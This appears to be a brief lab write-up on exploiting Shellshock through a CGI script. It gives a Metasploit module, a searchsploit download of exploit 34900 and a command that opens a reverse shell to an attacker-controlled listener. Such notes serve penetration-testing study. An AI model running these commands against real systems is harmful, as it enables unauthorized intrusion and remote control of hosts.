Metasploit module **multi/http/apache_mod_cgi_bash_env_exec**:
```msfconsole
set TARGETURI http://192.168.226.87/cgi-bin/test/test.cgi
```

**Non-metasploit solution**
Download exploit:
```bash
searchsploit -m 34900
```
Run exploit:
```bash
python2 34900.py payload=reverse lhost=192.168.45.160 lport=7777 rhost=192.168.226.87 pages=/cgi-bin/test/test.cgi
```
Result:
![[Pasted image 20240421115512.png]]